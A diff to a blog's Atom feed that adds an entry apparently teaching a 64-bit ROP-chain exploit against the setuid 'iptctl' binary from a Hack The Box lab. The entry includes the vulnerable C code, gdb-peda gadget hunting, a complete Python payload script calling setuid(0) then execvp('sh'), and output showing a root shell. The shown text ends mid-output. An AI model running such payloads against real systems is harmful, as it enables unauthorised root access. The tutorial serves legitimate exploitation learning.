@@ -4,13 +4,319 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2021-12-28T15:24:00+08:00</updated>
+ <updated>2022-01-15T10:11:22+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Bypass ASLR + NX (64-bit) - ROP Chain</title>
+   <link href="https://mvineza.github.io/spindel/2022/01/15/bypass-aslr-nx-64-bit-rop-chain"/>
+   <updated>2022-01-15T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/01/15/Bypass-ASLR-NX-64-bit-ROP-Chain</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;If ASLR and NX is enabled on a 64-bit program, this means we cannot execute code on stack and address space of libraries changes on every program run.&lt;/p&gt;
+
+&lt;p&gt;In this technique, we can find some ROP gadgets whose address are static and we can use them to do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid(0)&lt;/code&gt; and drop to a shell using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execvpe()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;environment-setup&quot;&gt;Environment Setup&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;SETUID program whose vulnerable to buffer overflow. In this example, we can see that even though &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fgets&lt;/code&gt; is assumed to be safe from bufferoverflow, a misconfigured program is still vulnerable.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// filename: iptctl&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// [...redacted...]&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// 360 bytes here&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#define BUFFSIZE 360
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inputAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// but destination buffer locally is 10 bytes only!&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// this is the buffer overflow part&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inputAction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Entering interactive mode&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Action(allow|restrict|show): &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// hence, fgets is not using the correct buffer size&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputAction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUFFSIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// this also have vulnerable fgets but we will ignore&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// this part since its hard to send arbritrary input&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// here, inputAddress is being validated properly&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUFFSIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;inputAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;c1&quot;&gt;// this is the validation part, isValidIpAddress is&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// validated properly but not isValidAction&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isValidAction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputAction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isValidIpAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Usage: %s allow|restrict|show IP&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inputAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inputAction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// [...redacted...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We will also use GDB peda as our debugger.&lt;/p&gt;
+
+&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Get a copy of binary and put it on your attacker machine&lt;/li&gt;
+  &lt;li&gt;Determine protections&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# check ASLR on victim machine&lt;/span&gt;
+penelope@redcross:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/sys/kernel/randomize_va_space
+2
+penelope@redcross:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# check PIE on gdb peda on attacker machine&lt;/span&gt;
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Find offset to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RIP&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# set breakpoints&lt;/span&gt;
+br &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;interactive+73
+br &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;interactive+73
+
+&lt;span class=&quot;c&quot;&gt;# create pattern - 50 is more than enough since we only need&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# 10 bytes to overflow&lt;/span&gt;
+pattern_create 50
+
+&lt;span class=&quot;c&quot;&gt;# run interactively&lt;/span&gt;
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;run &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
+Starting program: /home/kali/data/practice/hack_the_box/linux/redcross/iptctl &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
+Entering interactive mode
+Action&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;allow|restrict|show&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: allowAAA%AAsAABAA&lt;span class=&quot;nv&quot;&gt;$AAnAACAA&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-AA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;AADAA&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;AA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;AAEAAaAA0AAFAAbA
+&lt;span class=&quot;c&quot;&gt;# [...redacted....]&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# find offset - get value of &quot;saved rip&quot; first&lt;/span&gt;
+info frame 
+pattern_offset 0x4541412941413b41
+
+&lt;span class=&quot;c&quot;&gt;# offset is 29&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Since we cannot execute code on stack, we need to find a static address of gadgets we can use. These addresses will remain the same inside victim and attacker machine. I believe the reason is because PIE is not enabled on the program. We also wanted to do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setuid(0)&lt;/code&gt; first before dropping to shell via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execvp&lt;/code&gt; so that can gain the effective UID of root. Our payload structure will look like this. For detailed information about the payload structure, see the section below “Explaining the payload structure”.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;allow&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setuid_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rsi_pop_r15_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execvp_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1.1.1.1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Now let’s find the values&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# pop_rdi_addr&lt;/span&gt;
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropsearch &lt;span class=&quot;s2&quot;&gt;&quot;pop rdi&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# null&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# setuid_addr&lt;/span&gt;
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;plt
+&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+Breakpoint 37 at 0x400780 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;setuid@plt&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+gdb-peda&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# sh_addr&lt;/span&gt;
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;s2&quot;&gt;&quot;sh&quot;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+    iptctl : 0x40046e &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 0x7063727473006873 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'sh'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# pop_rsi_pop_r15_addr&lt;/span&gt;
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropsearch &lt;span class=&quot;s2&quot;&gt;&quot;pop rsi&quot;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+0x00400de1 : &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;s1&quot;&gt;'5e415fc3'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	pop rsi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop r15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# execvp_addr&lt;/span&gt;
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;plt
+Breakpoint 42 at 0x400760 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;execvp@plt&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# [...redacted...]&lt;/span&gt;
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Let’s construct our final python script. I will not use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwn&lt;/code&gt; tools to show how this is being done without any helper functions.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# gadgets and variables - take note that due to being little
+# endian, we need to consutrct the memory addresses in reverse
+# order. For example, if we see an addres in gdb which is
+# &quot;0x400760&quot; in python it will be &quot;\x60\x07\x40&quot;.
+# 
+# Another thing to take note of is that since we are dealing
+# with 64-bit architecture, you might often see in debuggers
+# that they only display 6 bytes of address instead of 8.
+# That's because the remaining 2 bytes are not used. So in our
+# python script, just replace the missing 2 bytes with NULL
+# bytes &quot;\x00\x00&quot;.                                                           
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe3\x0d\x40\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                                                                                   
+&lt;span class=&quot;n&quot;&gt;sh_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6e\04\x40\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                                                                               
+&lt;span class=&quot;n&quot;&gt;pop_rsi_pop_r15_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xe1\x0d\x40\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                                                                            
+&lt;span class=&quot;n&quot;&gt;execvp_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x60\x07\x40\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                                                                                   
+&lt;span class=&quot;n&quot;&gt;setuid_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x80\x07\x40\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                
+&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+                                                                                
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;allow&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setuid_addr&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rdi_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pop_rsi_pop_r15_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execvp_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1.1.1.1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Copy this script any run on victim machine&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;penelope@redcross:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python2 bof.py&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; -&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | /opt/iptctl/iptctl &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
+Entering interactive mode
+&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;penelope&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;egid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,24&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cdrom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,25&lt;span 